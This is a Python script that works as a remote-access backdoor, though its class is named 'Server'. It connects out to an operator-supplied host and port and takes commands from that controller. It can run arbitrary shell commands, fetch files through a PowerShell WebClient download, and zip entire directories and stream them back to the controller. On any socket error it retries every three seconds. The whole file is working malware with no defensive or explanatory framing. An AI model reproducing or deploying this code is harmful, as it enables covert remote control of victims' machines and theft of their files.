import sys
import time
import os
from uuid import uuid4
from zipfile import ZipFile
from socket import AF_INET, SOCK_STREAM, socket, error

def get_file_paths(directory) -> list:
	file_paths = []
	for root, directories, files in os.walk(directory):
		for filename in files:
			filepath = os.path.join(root, filename)
			file_paths.append(filepath)
	return file_paths


class Server:
    def __init__(self, host: str, port: int) -> None:
        self.host: str = host
        self.port: int = port
        self.socket: socket | None = None
        pass

    def start(self):
        try:
            self.socket = socket(AF_INET, SOCK_STREAM)
            self.socket.connect((self.host, self.port))

            while True:
                response: bytes = self.socket.recv(1024)
                cmd: str = response.decode("utf-8")

                if cmd == "quit":
                    break

                elif cmd == "close" or cmd == "--Ping":
                    continue

                elif cmd == "help":
                    msg = f'\n\nAvailable Commands:\n1) quit\n2) close\n3) help\n4) cwd\n5) run <file_name>\n6) download <url_path>\n7) copy <directory_path>\n\n'
                    self.socket.send(msg.encode())
                
                elif cmd == "cwd":
                    msg: bytes = f'CWD: {os.getcwd()}'.encode()
                    self.socket.send(msg)

                elif cmd.startswith("run "):
                    exe_cmd = cmd.split("run ")[1]

                    if os.system(exe_cmd) > 0:
                        msg = f'Program "{exe_cmd}" not found.'
                        self.socket.send(msg.encode())
                
                elif cmd.startswith("download "):
                    url_cmd = cmd.split("download ")[1]
                    pws_cmd = f'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadFile(\'{url_cmd}\', \'.\{url_cmd.split("/")[-1]}\');"'

                    if os.system(pws_cmd) > 0:
                        msg = f'Program "{pws_cmd}" not found.'
                        self.socket.send(msg.encode())
                
                elif cmd.startswith("copy "):
                    path_cmd = cmd.split("copy ")[1]

                    file_paths: list = get_file_paths(os.path.abspath(path_cmd))
                    
                    zipfile: str = f'{uuid4().hex}.zip'

                    with ZipFile(zipfile, 'w') as zip:
                        for file in file_paths:
                            zip.write(file)

                    BUFFER_SIZE = 1024

                    # get the file size
                    filesize = os.path.getsize(os.path.abspath(path_cmd))

                    self.socket.send(f'{filesize}'.encode())

                    with open(zipfile, "rb") as f:
                        while True:
                            # read the bytes from the file
                            bytes_read = f.read(BUFFER_SIZE)
                            if not bytes_read:
                                # file transmitting is done
                                break
                            self.socket.send(bytes_read)
                    self.socket.close()

                    os.remove(zipfile)

                else:
                    msg = f'Command "{cmd}" is not valid.'
                    self.socket.send(msg.encode())
                
                continue

            self.socket.close()

        except error:
            time.sleep(3)
            return self.start()
        pass
    

if __name__ == "__main__":
    Server(sys.argv[1], int(sys.argv[2])).start()